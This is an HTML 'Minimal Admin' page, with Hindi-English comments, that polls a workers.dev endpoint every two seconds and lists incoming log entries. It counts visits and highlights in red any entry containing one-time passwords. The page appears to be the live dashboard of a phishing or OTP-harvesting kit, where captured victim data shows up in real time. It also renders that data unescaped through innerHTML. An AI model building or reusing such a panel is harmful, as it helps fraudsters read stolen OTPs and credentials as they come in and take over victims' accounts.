<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Minimal Admin</title>
    <style>
        /* Extreme Reset: Sab kuch left se chipka do */
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: 'Arial', sans-serif;
            text-align: left !important;
        }

        body { 
            background-color: #ffffff; 
            padding: 10px;
            display: block;
        }

        /* Header */
        .header {
            width: 100%;
            padding: 10px 0;
            border-bottom: 2px solid #000; /* Moti Black Line Header ke liye */
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 { font-size: 14px; font-weight: 900; color: #000; }
        
        .v-badge {
            background: #000;
            color: #fff;
            padding: 2px 8px;
            font-weight: 900;
            font-size: 14px;
        }

        /* Logs Container */
        #logsDisplay {
            width: 100%;
            display: block;
        }

        /* Single Line Data (No Cart) */
        .log-item {
            width: 100%;
            padding: 10px 0; /* Upar niche thoda space */
            border-bottom: 1px solid #000; /* Sirf niche black line */
            color: #000000; /* Pure Black Text */
            font-weight: 800; /* Bold Text */
            font-size: 15px;
            line-height: 1.4;
            white-space: pre-wrap;
            word-break: break-all;
            display: block;
            clear: both;
        }

        .time-text {
            display: block;
            font-size: 10px;
            color: #666;
            font-weight: 400;
            margin-top: 5px;
        }

        /* OTP ko highlight karne ke liye sirf text color red (optional) */
        .otp-text { color: #ff0000 !important; }
    </style>
</head>
<body>

    <div class="header">
        <h1>LIVE DATA</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div id="logsDisplay">
        </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function fetchLogs() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                badge.innerText = data.length;

                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";

                    // Space hatane ke liye trim
                    let cleanDetail = log.detail.trim();
                    let isOtp = cleanDetail.toLowerCase().includes("otp:-");

                    return `
                        <div class="log-item ${isOtp ? 'otp-text' : ''}">
                            ${cleanDetail}
                            <span class="time-text">${log.time || ''}</span>
                        </div>
                    `;
                }).join('');

            } catch (e) { console.log("Updating..."); }
        }

        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
